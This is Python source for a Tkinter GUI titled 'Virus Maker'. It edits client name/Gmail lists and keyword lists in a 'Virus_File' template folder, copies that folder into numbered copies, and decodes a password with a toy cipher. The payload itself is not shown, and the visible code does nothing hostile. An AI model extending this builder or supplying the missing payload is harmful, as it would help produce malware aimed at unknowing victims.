import shutil
import tkinter as tk
import os
import sys

class MyGui:

    def __init__(self):
        self.Root = tk.Tk()
        self.Root.geometry("600x600")

        self.Root.title("Virus Maker")

        self.Label = tk.Label(self.Root, text="Virus Maker", font=("Arial", 18))
        self.Label.pack(padx=10, pady=10)

        self.LeftButton = tk.Button(self.Root, text="Decryption", font=("Arial", 16), command=self.ShowDecryptionWindow)
        self.LeftButton.place(x=0, y=80, height=50, width=300)

        self.RightButton = tk.Button(self.Root, text="Settings", font=("Arial", 16), command=self.ShowSettingsWindow)
        self.RightButton.place(x=300, y=80, height=50, width=300)

        self.DoneButton = tk.Button(self.Root, text="Done", font=("Arial", 16), command=self.Done)
        self.DoneMessage = tk.Text(self.Root)



        #decryption widgets
        self.PasswordEntry = tk.Entry(self.Root)
        self.AnswerText = tk.Text(self.Root)
        self.DecryptButton = tk.Button(self.Root, text="Decrypt password", font=("Arial", 16))


        #modify settings widgets

        self.Filepath = os.path.dirname(sys.argv[0])
        self.VirusFilePath = os.path.join(self.Filepath, "Virus_File")
        self.ClientsTxtFilePath = os.path.join(self.VirusFilePath, "Clients.txt")
        self.KeyWordsTxtFilePath = os.path.join(self.VirusFilePath, "KeyWords.txt")


        self.ClientButton = tk.Button(self.Root, text="Set Clients", font= ("Arial", 16))
        self.KeyWordsButton = tk.Button(self.Root, text="Set Keywords", font=("Arial", 16))
        self.ClientListText = tk.Text(self.Root, height=3, font=("Arial", 16))
        self.ClientListSaveButton = tk.Button(self.Root, text="Save Changes", font=("Arial", 16))
        self.ClientChangeFeedback = tk.Text(self.Root)
        self.KeywordsListText = tk.Text(self.Root, height=3, font=("Arial", 16))
        self.KeywordsListSaveButton = tk.Button(self.Root, text="Save Changes", font=("Arial", 16))
        self.KeywordsChangeFeedback = tk.Text(self.Root)




        self.Root.mainloop()

    def ShowDecryptionWindow(self):
        self.ResetScreen()
        self.PasswordEntry.place(x=150, y=300, height=20, width=300)
        self.DecryptButton.config(command=lambda: self.DecryptPassword(self.PasswordEntry.get()))
        self.DecryptButton.place(x=150, y=330, height=50, width=300)

    def DecryptPassword(self, word):
        AlphaBet = ['a', 'b', 'c',
                    'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
                    'x',
                    'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '+']
        IsValid = True
        for i in range(len(word)):
            if not word[i] in AlphaBet:
                IsValid = False

        if len(word) != 16 or not IsValid:
            self.AnswerText.delete('1.0', tk.END)
            self.AnswerText.insert(tk.END, "Password invalid")
            self.AnswerText.config(fg="red")
            self.AnswerText.place(x=150, y=400, height=30, width=300)


        else:
            NewWord = ""
            d = 11
            N = 38
            for i in range(len(word)):
                NewWord += AlphaBet[(AlphaBet.index(word[i]) ** d) % N]

            self.AnswerText.delete('1.0', tk.END)
            self.AnswerText.insert(tk.END, f"Password is: {NewWord}")
            self.AnswerText.config(fg="black")
            self.AnswerText.place(x=150, y=400, height=30, width=300)

    def ResetScreen(self):
        for widget in self.Root.winfo_children():
            if widget.winfo_y() > 130:
                widget.place_forget()



    def ShowSettingsWindow(self):
        self.ResetScreen()
        self.DoneButton.place(x=250, y=550, height=30, width=100)
        self.ClientButton.config(command=self.ShowClientsMenu)
        self.ClientButton.place(x=200, y=230, height=30, width=200)
        self.KeyWordsButton.config(command=self.ShowKeywordsMenu)
        self.KeyWordsButton.place(x=200, y=330, height=30, width=200)

    def ShowClientsMenu(self):
        self.ResetScreen()


        with open(self.ClientsTxtFilePath, "r") as file:
            content = file.read()
            file.close()
            self.ClientListText.delete(1.0, tk.END)
            self.ClientListText.insert(tk.END, content)
            self.ClientListText.place(x=100, y=250, height=100, width=400)

            self.ClientListSaveButton.config(command=lambda: self.SaveClientListChanges(self.ClientListText.get(1.0, tk.END)))
            self.ClientListSaveButton.place(x=200, y=400, height=30, width=200)


    def SaveClientListChanges(self, content):
        print(content)
        IsValidText = True
        lines = content.split("\n")

        for line in lines:
            if line != "":
                print(f"line {line}")
                if line.count(",") != 1:
                    IsValidText = False
                else:
                    name, email = line.split(',')
                    if len(email) > 10:
                        if email[-10:len(email)] != "@gmail.com":
                            IsValidText = False
                    else:
                        IsValidText = False

        with open(self.ClientsTxtFilePath, 'a') as file:

            if IsValidText:
                print("valid")
                file.truncate(0)
                file.write(content)
                file.close()

                self.ClientChangeFeedback.delete("1.0", tk.END)
                self.ClientChangeFeedback.insert(tk.END, "Changes Saved")
                self.ClientChangeFeedback.config(fg="black")
                self.ClientChangeFeedback.place(x=150, y=450, height=30, width=300)

            else:
                self.ClientChangeFeedback.delete("1.0", tk.END)
                self.ClientChangeFeedback.insert(tk.END, "Invalid Text, Try Again")
                self.ClientChangeFeedback.config(fg="red")
                self.ClientChangeFeedback.place(x=150, y=450, height=30, width=300)


            file.close()
            print("file closed")

    def ShowKeywordsMenu(self):
        self.ResetScreen()


        with open(self.KeyWordsTxtFilePath, "r") as file:
            content = file.read()
            file.close()
            self.KeywordsListText.delete(1.0, tk.END)
            self.KeywordsListText.insert(tk.END, content)
            self.KeywordsListText.place(x=100, y=250, height=100, width=400)

            self.KeywordsListSaveButton.config(command=lambda: self.SaveKeywordsListChanges(self.KeywordsListText.get(1.0, tk.END)))
            self.KeywordsListSaveButton.place(x=200, y=400, height=30, width=200)

    def SaveKeywordsListChanges(self, content):
        with open(self.KeyWordsTxtFilePath, 'a') as file:

            file.truncate(0)
            file.write(content)
            file.close()

        self.KeywordsChangeFeedback.delete("1.0", tk.END)
        self.KeywordsChangeFeedback.insert(tk.END, "Changes Saved")
        self.KeywordsChangeFeedback.config(fg="black")
        self.KeywordsChangeFeedback.place(x=150, y=450, height=30, width=300)

    def Done(self):
        self.ResetScreen()
        max = 0
        CopyName = "VirusCopyNo"
        for name in os.listdir(self.Filepath):
            if len(name) > 10:
                if name[0:11] == CopyName:
                    if max < int(name[11:len(name)]):
                        max = int(name[11:len(name)])

        CopyFilePath = os.path.join(self.Filepath, CopyName + str(max + 1))

        #os.makedirs(CopyFilePath, exist_ok=True)
        shutil.copytree(self.VirusFilePath, CopyFilePath)

        with open(os.path.join(self.VirusFilePath, "App.txt"), 'a') as file:
            file.truncate(0)
            file.close()

        with open(os.path.join(self.VirusFilePath, "Clients.txt"), 'a') as file:
            file.truncate(0)
            file.close()

        with open(os.path.join(self.VirusFilePath, "KeyWords.txt"), 'a') as file:
            file.truncate(0)
            file.close()





def main():
    NewGui = MyGui()


if __name__ == '__main__':
    main()
